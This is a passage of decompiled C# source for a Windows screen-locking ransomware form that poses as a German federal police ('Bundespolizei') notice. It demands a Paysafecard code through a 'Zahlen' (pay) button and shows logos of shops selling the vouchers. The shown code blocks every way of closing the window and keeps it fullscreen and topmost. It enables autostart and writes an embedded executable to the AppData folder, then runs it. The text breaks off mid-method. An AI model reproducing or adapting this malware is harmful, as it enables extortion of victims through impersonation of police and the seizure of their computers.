using System;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;
using ns2;
using ns3;
using ns4;
using ns5;

namespace ns1;

[DesignerGenerated]
internal class frmLock : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("btnExit")]
	private Button _btnExit;

	[AccessedThroughProperty("btnZahlen")]
	private Button _btnZahlen;

	[AccessedThroughProperty("lblInfo")]
	private Label _lblInfo;

	[AccessedThroughProperty("txtPSC")]
	private TextBox _txtPSC;

	[AccessedThroughProperty("lblPSC")]
	private Label _lblPSC;

	[AccessedThroughProperty("pbBundepolizei")]
	private PictureBox _pbBundepolizei;

	[AccessedThroughProperty("pbPaysafe")]
	private PictureBox _pbPaysafe;

	[AccessedThroughProperty("lblInfo2")]
	private Label _lblInfo2;

	[AccessedThroughProperty("tmrRemaining")]
	private Timer timer_0;

	[AccessedThroughProperty("lblTime")]
	private Label _lblTime;

	[AccessedThroughProperty("lblRemainingTime")]
	private Label _lblRemainingTime;

	[AccessedThroughProperty("lblCaptcha")]
	private Label _lblCaptcha;

	[AccessedThroughProperty("pbCaptcha")]
	private PictureBox _pbCaptcha;

	[AccessedThroughProperty("txtCaptcha")]
	private TextBox _txtCaptcha;

	[AccessedThroughProperty("btnCaptchaOK")]
	private Button _btnCaptchaOK;

	[AccessedThroughProperty("tbOpacity")]
	private TrackBar _tbOpacity;

	[AccessedThroughProperty("lblStatus")]
	private Label _lblStatus;

	[AccessedThroughProperty("pbRossmann")]
	private PictureBox _pbRossmann;

	[AccessedThroughProperty("pbAgip")]
	private PictureBox _pbAgip;

	[AccessedThroughProperty("pbAral")]
	private PictureBox _pbAral;

	[AccessedThroughProperty("pbEsso")]
	private PictureBox _pbEsso;

	[AccessedThroughProperty("pbNetto")]
	private PictureBox _pbNetto;

	[AccessedThroughProperty("pbOMV")]
	private PictureBox _pbOMV;

	[AccessedThroughProperty("pbHAutomat")]
	private PictureBox _pbHAutomat;

	private Stopwatch stopwatch_0;

	private Thread thread_0;

	private Thread thread_1;

	private Thread thread_2;

	private Thread thread_3;

	private Thread thread_4;

	private Class13 class13_0;

	private string string_0;

	private string[] string_1;

	private Clock clock_0;

	private int int_0;

	internal virtual Button btnExit
	{
		get
		{
			return _btnExit;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = btnExit_Click;
			if (_btnExit != null)
			{
				((Control)_btnExit).remove_Click(eventHandler);
			}
			_btnExit = value;
			if (_btnExit != null)
			{
				((Control)_btnExit).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnZahlen
	{
		get
		{
			return _btnZahlen;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = btnZahlen_Click;
			if (_btnZahlen != null)
			{
				((Control)_btnZahlen).remove_Click(eventHandler);
			}
			_btnZahlen = value;
			if (_btnZahlen != null)
			{
				((Control)_btnZahlen).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label lblInfo
	{
		get
		{
			return _lblInfo;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_lblInfo = value;
		}
	}

	internal virtual TextBox txtPSC
	{
		get
		{
			return _txtPSC;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_txtPSC = value;
		}
	}

	internal virtual Label lblPSC
	{
		get
		{
			return _lblPSC;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_lblPSC = value;
		}
	}

	internal virtual PictureBox pbBundepolizei
	{
		get
		{
			return _pbBundepolizei;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_pbBundepolizei = value;
		}
	}

	internal virtual PictureBox pbPaysafe
	{
		get
		{
			return _pbPaysafe;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_pbPaysafe = value;
		}
	}

	internal virtual Label lblInfo2
	{
		get
		{
			return _lblInfo2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_lblInfo2 = value;
		}
	}

	internal virtual Timer tmrRemaining
	{
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = tmrRemaining_Tick;
			if (timer_0 != null)
			{
				timer_0.remove_Tick(eventHandler);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label lblTime
	{
		get
		{
			return _lblTime;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_lblTime = value;
		}
	}

	internal virtual Label lblRemainingTime
	{
		get
		{
			return _lblRemainingTime;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_lblRemainingTime = value;
		}
	}

	internal virtual Label lblCaptcha
	{
		get
		{
			return _lblCaptcha;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_lblCaptcha = value;
		}
	}

	internal virtual PictureBox pbCaptcha
	{
		get
		{
			return _pbCaptcha;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_pbCaptcha = value;
		}
	}

	internal virtual TextBox txtCaptcha
	{
		get
		{
			return _txtCaptcha;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_txtCaptcha = value;
		}
	}

	internal virtual Button btnCaptchaOK
	{
		get
		{
			return _btnCaptchaOK;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = btnCaptchaOK_Click;
			if (_btnCaptchaOK != null)
			{
				((Control)_btnCaptchaOK).remove_Click(eventHandler);
			}
			_btnCaptchaOK = value;
			if (_btnCaptchaOK != null)
			{
				((Control)_btnCaptchaOK).add_Click(eventHandler);
			}
		}
	}

	internal virtual TrackBar tbOpacity
	{
		get
		{
			return _tbOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = tbOpacity_ValueChanged;
			if (_tbOpacity != null)
			{
				_tbOpacity.remove_ValueChanged(eventHandler);
			}
			_tbOpacity = value;
			if (_tbOpacity != null)
			{
				_tbOpacity.add_ValueChanged(eventHandler);
			}
		}
	}

	internal virtual Label lblStatus
	{
		get
		{
			return _lblStatus;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_lblStatus = value;
		}
	}

	internal virtual PictureBox pbRossmann
	{
		get
		{
			return _pbRossmann;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_pbRossmann = value;
		}
	}

	internal virtual PictureBox pbAgip
	{
		get
		{
			return _pbAgip;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_pbAgip = value;
		}
	}

	internal virtual PictureBox pbAral
	{
		get
		{
			return _pbAral;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_pbAral = value;
		}
	}

	internal virtual PictureBox pbEsso
	{
		get
		{
			return _pbEsso;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_pbEsso = value;
		}
	}

	internal virtual PictureBox pbNetto
	{
		get
		{
			return _pbNetto;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_pbNetto = value;
		}
	}

	internal virtual PictureBox pbOMV
	{
		get
		{
			return _pbOMV;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_pbOMV = value;
		}
	}

	internal virtual PictureBox pbHAutomat
	{
		get
		{
			return _pbHAutomat;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_pbHAutomat = value;
		}
	}

	public frmLock()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(frmLock_FormClosing));
		((Control)this).add_HandleCreated((EventHandler)frmLock_HandleCreated);
		((Form)this).add_Load((EventHandler)frmLock_Load);
		stopwatch_0 = new Stopwatch();
		thread_0 = new Thread(Class5.smethod_0);
		thread_1 = new Thread(Class9.smethod_3);
		thread_2 = new Thread(Class9.smethod_3);
		thread_3 = new Thread(Class9.smethod_3);
		thread_4 = new Thread(Class9.smethod_3);
		class13_0 = new Class13();
		string_0 = string.Empty;
		clock_0 = new Clock();
		int_0 = 1;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_01d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01dd: Expected O, but got Unknown
		//IL_0268: Unknown result type (might be due to invalid IL or missing references)
		//IL_0272: Expected O, but got Unknown
		//IL_030a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0314: Expected O, but got Unknown
		//IL_0407: Unknown result type (might be due to invalid IL or missing references)
		//IL_0411: Expected O, but got Unknown
		//IL_049f: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a9: Expected O, but got Unknown
		//IL_054e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0558: Expected O, but got Unknown
		//IL_05e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ee: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmLock));
		btnExit = new Button();
		btnZahlen = new Button();
		lblInfo = new Label();
		txtPSC = new TextBox();
		lblPSC = new Label();
		lblInfo2 = new Label();
		tmrRemaining = new Timer(icontainer_0);
		lblTime = new Label();
		lblRemainingTime = new Label();
		lblCaptcha = new Label();
		txtCaptcha = new TextBox();
		btnCaptchaOK = new Button();
		tbOpacity = new TrackBar();
		lblStatus = new Label();
		pbHAutomat = new PictureBox();
		pbOMV = new PictureBox();
		pbNetto = new PictureBox();
		pbEsso = new PictureBox();
		pbAral = new PictureBox();
		pbAgip = new PictureBox();
		pbRossmann = new PictureBox();
		pbCaptcha = new PictureBox();
		pbPaysafe = new PictureBox();
		pbBundepolizei = new PictureBox();
		((ISupportInitialize)tbOpacity).BeginInit();
		((ISupportInitialize)pbHAutomat).BeginInit();
		((ISupportInitialize)pbOMV).BeginInit();
		((ISupportInitialize)pbNetto).BeginInit();
		((ISupportInitialize)pbEsso).BeginInit();
		((ISupportInitialize)pbAral).BeginInit();
		((ISupportInitialize)pbAgip).BeginInit();
		((ISupportInitialize)pbRossmann).BeginInit();
		((ISupportInitialize)pbCaptcha).BeginInit();
		((ISupportInitialize)pbPaysafe).BeginInit();
		((ISupportInitialize)pbBundepolizei).BeginInit();
		((Control)this).SuspendLayout();
		((Control)btnExit).set_Anchor((AnchorStyles)2);
		((Control)btnExit).set_Enabled(false);
		((Control)btnExit).set_Font(new Font("Arial Narrow", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Button obj = btnExit;
		Point location = new Point(651, 961);
		((Control)obj).set_Location(location);
		((Control)btnExit).set_Name("btnExit");
		Button obj2 = btnExit;
		Size size = new Size(113, 51);
		((Control)obj2).set_Size(size);
		((Control)btnExit).set_TabIndex(0);
		((ButtonBase)btnExit).set_Text("Exit");
		((ButtonBase)btnExit).set_UseVisualStyleBackColor(true);
		((Control)btnZahlen).set_Anchor((AnchorStyles)2);
		((Control)btnZahlen).set_Font(new Font("Arial Narrow", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Button obj3 = btnZahlen;
		location = new Point(503, 961);
		((Control)obj3).set_Location(location);
		((Control)btnZahlen).set_Name("btnZahlen");
		Button obj4 = btnZahlen;
		size = new Size(113, 51);
		((Control)obj4).set_Size(size);
		((Control)btnZahlen).set_TabIndex(1);
		((ButtonBase)btnZahlen).set_Text("Zahlen");
		((ButtonBase)btnZahlen).set_UseVisualStyleBackColor(true);
		((Control)lblInfo).set_Anchor((AnchorStyles)13);
		lblInfo.set_AutoSize(true);
		((Control)lblInfo).set_Font(new Font("Arial Narrow", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj5 = lblInfo;
		location = new Point(276, 41);
		((Control)obj5).set_Location(location);
		((Control)lblInfo).set_Name("lblInfo");
		Label obj6 = lblInfo;
		size = new Size(968, 380);
		((Control)obj6).set_Size(size);
		((Control)lblInfo).set_TabIndex(2);
		lblInfo.set_Text(componentResourceManager.GetString("lblInfo.Text"));
		((Control)txtPSC).set_Anchor((AnchorStyles)2);
		TextBox obj7 = txtPSC;
		location = new Point(456, 711);
		((Control)obj7).set_Location(location);
		((Control)txtPSC).set_Name("txtPSC");
		TextBox obj8 = txtPSC;
		size = new Size(254, 20);
		((Control)obj8).set_Size(size);
		((Control)txtPSC).set_TabIndex(3);
		((Control)lblPSC).set_Anchor((AnchorStyles)2);
		lblPSC.set_AutoSize(true);
		((Control)lblPSC).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label obj9 = lblPSC;
		location = new Point(453, 695);
		((Control)obj9).set_Location(location);
		((Control)lblPSC).set_Name("lblPSC");
		Label obj10 = lblPSC;
		size = new Size(171, 13);
		((Control)obj10).set_Size(size);
		((Control)lblPSC).set_TabIndex(4);
		lblPSC.set_Text("PSC: (0000-0000-0000-0000)");
		((Control)lblInfo2).set_Anchor((AnchorStyles)2);
		lblInfo2.set_AutoSize(true);
		((Control)lblInfo2).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj11 = lblInfo2;
		location = new Point(421, 863);
		((Control)obj11).set_Location(location);
		((Control)lblInfo2).set_Name("lblInfo2");
		Label obj12 = lblInfo2;
		size = new Size(849, 68);
		((Control)obj12).set_Size(size);
		((Control)lblInfo2).set_TabIndex(9);
		lblInfo2.set_Text(componentResourceManager.GetString("lblInfo2.Text"));
		tmrRemaining.set_Interval(1000);
		((Control)lblTime).set_Anchor((AnchorStyles)2);
		lblTime.set_AutoSize(true);
		((Control)lblTime).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label obj13 = lblTime;
		location = new Point(1035, 736);
		((Control)obj13).set_Location(location);
		((Control)lblTime).set_Name("lblTime");
		Label obj14 = lblTime;
		size = new Size(72, 17);
		((Control)obj14).set_Size(size);
		((Control)lblTime).set_TabIndex(10);
		lblTime.set_Text("00:00:00");
		((Control)lblRemainingTime).set_Anchor((AnchorStyles)2);
		lblRemainingTime.set_AutoSize(true);
		((Control)lblRemainingTime).set_Font(new Font("Microsoft Sans Serif", 14f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label obj15 = lblRemainingTime;
		location = new Point(993, 706);
		((Control)obj15).set_Location(location);
		((Control)lblRemainingTime).set_Name("lblRemainingTime");
		Label obj16 = lblRemainingTime;
		size = new Size(173, 24);
		((Control)obj16).set_Size(size);
		((Control)lblRemainingTime).set_TabIndex(11);
		lblRemainingTime.set_Text("Vergangene Zeit:");
		((Control)lblCaptcha).set_Anchor((AnchorStyles)2);
		lblCaptcha.set_AutoSize(true);
		Label obj17 = lblCaptcha;
		location = new Point(453, 796);
		((Control)obj17).set_Location(location);
		((Control)lblCaptcha).set_Name("lblCaptcha");
		Label obj18 = lblCaptcha;
		size = new Size(50, 13);
		((Control)obj18).set_Size(size);
		((Control)lblCaptcha).set_TabIndex(12);
		lblCaptcha.set_Text("Captcha:");
		((Control)txtCaptcha).set_Anchor((AnchorStyles)2);
		TextBox obj19 = txtCaptcha;
		location = new Point(456, 812);
		((Control)obj19).set_Location(location);
		((Control)txtCaptcha).set_Name("txtCaptcha");
		TextBox obj20 = txtCaptcha;
		size = new Size(100, 20);
		((Control)obj20).set_Size(size);
		((Control)txtCaptcha).set_TabIndex(14);
		((Control)btnCaptchaOK).set_Anchor((AnchorStyles)2);
		((Control)btnCaptchaOK).set_Enabled(false);
		Button obj21 = btnCaptchaOK;
		location = new Point(559, 812);
		((Control)obj21).set_Location(location);
		((Control)btnCaptchaOK).set_Name("btnCaptchaOK");
		Button obj22 = btnCaptchaOK;
		size = new Size(32, 20);
		((Control)obj22).set_Size(size);
		((Control)btnCaptchaOK).set_TabIndex(15);
		((ButtonBase)btnCaptchaOK).set_Text("OK");
		((ButtonBase)btnCaptchaOK).set_UseVisualStyleBackColor(true);
		((Control)tbOpacity).set_Anchor((AnchorStyles)2);
		((Control)tbOpacity).set_Enabled(false);
		TrackBar obj23 = tbOpacity;
		location = new Point(169, 967);
		((Control)obj23).set_Location(location);
		tbOpacity.set_Maximum(100);
		tbOpacity.set_Minimum(40);
		((Control)tbOpacity).set_Name("tbOpacity");
		TrackBar obj24 = tbOpacity;
		size = new Size(159, 45);
		((Control)obj24).set_Size(size);
		((Control)tbOpacity).set_TabIndex(16);
		tbOpacity.set_Value(96);
		((Control)lblStatus).set_Anchor((AnchorStyles)2);
		lblStatus.set_AutoSize(true);
		Label obj25 = lblStatus;
		location = new Point(603, 819);
		((Control)obj25).set_Location(location);
		((Control)lblStatus).set_Name("lblStatus");
		Label obj26 = lblStatus;
		size = new Size(45, 13);
		((Control)obj26).set_Size(size);
		((Control)lblStatus).set_TabIndex(17);
		lblStatus.set_Text("Warte...");
		((Control)pbHAutomat).set_Anchor((AnchorStyles)2);
		pbHAutomat.set_Image((Image)(object)Class18.banananeu);
		PictureBox obj27 = pbHAutomat;
		location = new Point(215, 799);
		((Control)obj27).set_Location(location);
		((Control)pbHAutomat).set_Name("pbHAutomat");
		PictureBox obj28 = pbHAutomat;
		size = new Size(81, 122);
		((Control)obj28).set_Size(size);
		pbHAutomat.set_SizeMode((PictureBoxSizeMode)1);
		pbHAutomat.set_TabIndex(24);
		pbHAutomat.set_TabStop(false);
		((Control)pbOMV).set_Anchor((AnchorStyles)2);
		pbOMV.set_Image((Image)(object)Class18.omv);
		PictureBox obj29 = pbOMV;
		location = new Point(302, 799);
		((Control)obj29).set_Location(location);
		((Control)pbOMV).set_Name("pbOMV");
		PictureBox obj30 = pbOMV;
		size = new Size(81, 66);
		((Control)obj30).set_Size(size);
		pbOMV.set_SizeMode((PictureBoxSizeMode)1);
		pbOMV.set_TabIndex(23);
		pbOMV.set_TabStop(false);
		((Control)pbNetto).set_Anchor((AnchorStyles)2);
		pbNetto.set_Image((Image)(object)Class18.nettodiscount);
		PictureBox obj31 = pbNetto;
		location = new Point(129, 799);
		((Control)obj31).set_Location(location);
		((Control)pbNetto).set_Name("pbNetto");
		PictureBox obj32 = pbNetto;
		size = new Size(81, 66);
		((Control)obj32).set_Size(size);
		pbNetto.set_SizeMode((PictureBoxSizeMode)1);
		pbNetto.set_TabIndex(22);
		pbNetto.set_TabStop(false);
		((Control)pbEsso).set_Anchor((AnchorStyles)2);
		pbEsso.set_Image((Image)(object)Class18.esso);
		PictureBox obj33 = pbEsso;
		location = new Point(302, 727);
		((Control)obj33).set_Location(location);
		((Control)pbEsso).set_Name("pbEsso");
		PictureBox obj34 = pbEsso;
		size = new Size(81, 66);
		((Control)obj34).set_Size(size);
		pbEsso.set_SizeMode((PictureBoxSizeMode)1);
		pbEsso.set_TabIndex(21);
		pbEsso.set_TabStop(false);
		((Control)pbAral).set_Anchor((AnchorStyles)2);
		pbAral.set_Image((Image)(object)Class18.aral);
		PictureBox obj35 = pbAral;
		location = new Point(215, 727);
		((Control)obj35).set_Location(location);
		((Control)pbAral).set_Name("pbAral");
		PictureBox obj36 = pbAral;
		size = new Size(81, 66);
		((Control)obj36).set_Size(size);
		pbAral.set_SizeMode((PictureBoxSizeMode)1);
		pbAral.set_TabIndex(20);
		pbAral.set_TabStop(false);
		((Control)pbAgip).set_Anchor((AnchorStyles)2);
		pbAgip.set_Image((Image)(object)Class18.AgipLogo);
		PictureBox obj37 = pbAgip;
		location = new Point(129, 727);
		((Control)obj37).set_Location(location);
		((Control)pbAgip).set_Name("pbAgip");
		PictureBox obj38 = pbAgip;
		size = new Size(81, 66);
		((Control)obj38).set_Size(size);
		pbAgip.set_SizeMode((PictureBoxSizeMode)1);
		pbAgip.set_TabIndex(19);
		pbAgip.set_TabStop(false);
		((Control)pbRossmann).set_Anchor((AnchorStyles)2);
		pbRossmann.set_Image((Image)(object)Class18.rossmann);
		PictureBox obj39 = pbRossmann;
		location = new Point(129, 668);
		((Control)obj39).set_Location(location);
		((Control)pbRossmann).set_Name("pbRossmann");
		PictureBox obj40 = pbRossmann;
		size = new Size(254, 53);
		((Control)obj40).set_Size(size);
		pbRossmann.set_SizeMode((PictureBoxSizeMode)1);
		pbRossmann.set_TabIndex(18);
		pbRossmann.set_TabStop(false);
		((Control)pbCaptcha).set_Anchor((AnchorStyles)2);
		PictureBox obj41 = pbCaptcha;
		location = new Point(456, 737);
		((Control)obj41).set_Location(location);
		((Control)pbCaptcha).set_Name("pbCaptcha");
		PictureBox obj42 = pbCaptcha;
		size = new Size(160, 56);
		((Control)obj42).set_Size(size);
		pbCaptcha.set_SizeMode((PictureBoxSizeMode)1);
		pbCaptcha.set_TabIndex(13);
		pbCaptcha.set_TabStop(false);
		((Control)pbPaysafe).set_Anchor((AnchorStyles)2);
		pbPaysafe.set_Image((Image)(object)Class18.paysafecard);
		PictureBox obj43 = pbPaysafe;
		location = new Point(755, 581);
		((Control)obj43).set_Location(location);
		((Control)pbPaysafe).set_Name("pbPaysafe");
		PictureBox obj44 = pbPaysafe;
		size = new Size(97, 220);
		((Control)obj44).set_Size(size);
		pbPaysafe.set_SizeMode((PictureBoxSizeMode)1);
		pbPaysafe.set_TabIndex(8);
		pbPaysafe.set_TabStop(false);
		pbBundepolizei.set_Image((Image)(object)Class18.bundespolizei);
		PictureBox obj45 = pbBundepolizei;
		location = new Point(0, 41);
		((Control)obj45).set_Location(location);
		((Control)pbBundepolizei).set_Name("pbBundepolizei");
		PictureBox obj46 = pbBundepolizei;
		size = new Size(272, 185);
		((Control)obj46).set_Size(size);
		pbBundepolizei.set_SizeMode((PictureBoxSizeMode)4);
		pbBundepolizei.set_TabIndex(7);
		pbBundepolizei.set_TabStop(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ButtonHighlight);
		size = new Size(1280, 1024);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)pbHAutomat);
		((Control)this).get_Controls().Add((Control)(object)pbOMV);
		((Control)this).get_Controls().Add((Control)(object)pbNetto);
		((Control)this).get_Controls().Add((Control)(object)pbEsso);
		((Control)this).get_Controls().Add((Control)(object)pbAral);
		((Control)this).get_Controls().Add((Control)(object)pbAgip);
		((Control)this).get_Controls().Add((Control)(object)pbRossmann);
		((Control)this).get_Controls().Add((Control)(object)lblStatus);
		((Control)this).get_Controls().Add((Control)(object)tbOpacity);
		((Control)this).get_Controls().Add((Control)(object)btnCaptchaOK);
		((Control)this).get_Controls().Add((Control)(object)txtCaptcha);
		((Control)this).get_Controls().Add((Control)(object)pbCaptcha);
		((Control)this).get_Controls().Add((Control)(object)lblCaptcha);
		((Control)this).get_Controls().Add((Control)(object)lblRemainingTime);
		((Control)this).get_Controls().Add((Control)(object)lblTime);
		((Control)this).get_Controls().Add((Control)(object)lblInfo2);
		((Control)this).get_Controls().Add((Control)(object)pbPaysafe);
		((Control)this).get_Controls().Add((Control)(object)pbBundepolizei);
		((Control)this).get_Controls().Add((Control)(object)lblPSC);
		((Control)this).get_Controls().Add((Control)(object)txtPSC);
		((Control)this).get_Controls().Add((Control)(object)lblInfo);
		((Control)this).get_Controls().Add((Control)(object)btnZahlen);
		((Control)this).get_Controls().Add((Control)(object)btnExit);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmLock");
		((Form)this).set_Opacity(0.96);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((ISupportInitialize)tbOpacity).EndInit();
		((ISupportInitialize)pbHAutomat).EndInit();
		((ISupportInitialize)pbOMV).EndInit();
		((ISupportInitialize)pbNetto).EndInit();
		((ISupportInitialize)pbEsso).EndInit();
		((ISupportInitialize)pbAral).EndInit();
		((ISupportInitialize)pbAgip).EndInit();
		((ISupportInitialize)pbRossmann).EndInit();
		((ISupportInitialize)pbCaptcha).EndInit();
		((ISupportInitialize)pbPaysafe).EndInit();
		((ISupportInitialize)pbBundepolizei).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void frmLock_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Invalid comparison between Unknown and I4
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Invalid comparison between Unknown and I4
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Invalid comparison between Unknown and I4
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Invalid comparison between Unknown and I4
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 1)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
		else if ((int)e.get_CloseReason() == 6)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
		else if ((int)e.get_CloseReason() == 5)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
		else if ((int)e.get_CloseReason() == 4)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
		else if ((int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
		else if ((int)e.get_CloseReason() == 2)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void frmLock_HandleCreated(object sender, EventArgs e)
	{
		Class5.smethod_1();
		Class15.smethod_0(1);
		Class6.smethod_0(AutostartEnable: true);
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\process.exe"))
			{
				File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\process.exe", Class18.Release);
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\process.exe").WaitForExit();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		thread_0.Start();
	}

	private void frmLock_Load(object sender, EventArgs e)
	{
		AppDomain.CurrentDomain.ProcessExit += Class15.smethod_1;
		AppDomain.CurrentDomain.DomainUnload += Class15.smethod_1;
		Application.add_ApplicationExit((EventHandler)Class15.smethod_1);
		Class10.smethod_1();
		Class14.smethod_0();
